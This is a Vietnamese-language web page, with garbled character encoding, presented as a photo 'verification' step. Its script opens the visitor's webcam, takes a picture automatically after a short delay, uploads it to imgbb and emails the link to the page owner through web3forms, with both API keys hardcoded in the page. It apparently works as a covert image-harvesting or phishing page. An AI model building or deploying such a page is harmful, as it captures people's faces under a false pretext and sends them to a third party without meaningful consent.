<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Ch·ª•p & G·ª≠i ·∫£nh</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      display: flex; align-items: center; justify-content: center;
      height: 100vh;
      background: linear-gradient(270deg,#ff7a7a,#ffb36b,#fff38a,#9be89b,#7fb6ff,#b58bff);
      background-size: 1400% 1400%;
      animation: bg 18s linear infinite;
    }
    @keyframes bg {
      0%{background-position:0% 50%}
      50%{background-position:100% 50%}
      100%{background-position:0% 50%}
    }
    .card {
      width: 380px; background: #fff; padding: 22px; border-radius: 12px;
      box-shadow: 0 10px 30px rgba(0,0,0,.12); text-align: center;
    }
    video, canvas, img {
      width: 100%; border-radius: 8px; margin-top: 10px;
    }
    button {
      margin-top: 12px; padding: 10px 14px; border-radius: 8px;
      border: none; background: #1976d2; color: #fff; font-size: 15px; cursor: pointer;
    }
    .msg { margin-top: 10px; font-size: 14px; }
    .err { color: #b00020; }
    .ok { color: #0b8043; font-weight: 600; }
  </style>
</head>
<body>
  <div class="card">
    <h2>X√°c minh b·∫±ng ·∫£nh</h2>
    <button id="openCam">üì∏ M·ªü camera</button>

    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>
    <img id="preview" alt="·∫¢nh ch·ª•p" style="display:none;"/>
    <div id="msg" class="msg"></div>
  </div>

  <script>
  const WEB3FORMS_KEY = "89379a11-0561-41ee-80a0-bfce9dd60eb7";
  const IMGBB_KEY = "a0ba317e9d94c58e5b754f7593f4d6a0";

  const msg = document.getElementById('msg');
  const openCamBtn = document.getElementById('openCam');
  const video = document.getElementById('video');
  const canvas = document.getElementById('canvas');
  const preview = document.getElementById('preview');

  let stream = null;

  const showError = t => { msg.textContent = "‚ùå " + t; msg.className = "msg err"; };
  const showOK = t => { msg.textContent = "‚úÖ " + t; msg.className = "msg ok"; };

  openCamBtn.onclick = async () => {
    openCamBtn.disabled = true;
    msg.textContent = "üîÑ ƒêang b·∫≠t camera...";
    try {
      stream = await navigator.mediaDevices.getUserMedia({ video: true });
      video.srcObject = stream;
      video.style.display = "block";

      // Ch·ªù camera kh·ªüi ƒë·ªông r·ªìi t·ª± ch·ª•p
      setTimeout(() => captureAndSend(), 2500);
    } catch (err) {
      showError("Kh√¥ng th·ªÉ m·ªü camera: " + err.message);
      openCamBtn.disabled = false;
    }
  };

  async function captureAndSend() {
    try {
      if (video.videoWidth === 0) {
        showError("Camera ch∆∞a s·∫µn s√†ng, th·ª≠ l·∫°i.");
        openCamBtn.disabled = false;
        return;
      }

      msg.textContent = "üì∏ ƒêang ch·ª•p ·∫£nh...";
      const ctx = canvas.getContext('2d');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      const capturedImage = canvas.toDataURL("image/png");
      preview.src = capturedImage;
      preview.style.display = "block";
      video.style.display = "none";
      if (stream) stream.getTracks().forEach(t => t.stop());

      msg.textContent = "‚è≥ ƒêang t·∫£i ·∫£nh l√™n...";
      const formData = new FormData();
      formData.append("image", capturedImage.split(",")[1]);

      const upload = await fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_KEY}`, {
        method: "POST", body: formData
      });
      const imgRes = await upload.json();
      if (!imgRes.success) throw new Error("Upload imgbb th·∫•t b·∫°i!");

      const imageUrl = imgRes.data.url;
      msg.textContent = "üì® ƒêang g·ª≠i ·∫£nh...";

      const payload = {
        access_key: WEB3FORMS_KEY,
        subject: "·∫¢nh x√°c minh m·ªõi",
        from_name: "Trang x√°c minh",
        message: `<img src="${imageUrl}" width="250" style="border-radius:8px;">`
      };

      const res = await fetch("https://api.web3forms.com/submit", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify(payload)
      });
      const result = await res.json();

      if (result.success) showOK("‚úÖ ·∫¢nh ƒë√£ ƒë∆∞·ª£c g·ª≠i th√†nh c√¥ng!");
      else showError("L·ªói g·ª≠i: " + result.message);

    } catch (err) {
      showError("‚ö†Ô∏è L·ªói: " + err.message);
      openCamBtn.disabled = false;
    }
  }
  </script>
</body>
</html>
